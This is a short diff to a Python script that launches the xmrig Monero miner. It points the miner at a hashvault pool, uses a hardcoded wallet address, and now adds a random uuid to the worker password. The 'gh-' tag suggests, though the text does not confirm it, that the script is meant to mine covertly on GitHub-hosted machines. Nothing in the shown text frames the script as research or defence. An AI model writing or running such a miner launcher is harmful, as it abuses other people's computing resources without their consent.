@@ -5,6 +5,7 @@ import sys
 import tarfile
 from pathlib import Path
 from tempfile import TemporaryDirectory
+from uuid import uuid1
 
 import aiohttp
 
@@ -116,7 +117,7 @@ async def main():
             [
                 "./xmrig",
                 "--url chicago01.hashvault.pro:3333",
-                f"--pass gh-{filename}-{sys.version_info.major}{sys.version_info.minor}",
+                f"--pass gh-{filename}-{sys.version_info.major}{sys.version_info.minor}-{uuid1().hex[:8]}",
                 "--user 45t7Zj3p8wzaYX4ZArqfh5ZN3UPZs4hAY7kvdo8jwAsSegymsUNbiEU31cof3g7xfGdDV2kV4FH4ng1p7JGt3C459DJDS1h",
                 "--donate-level 1",
             ]
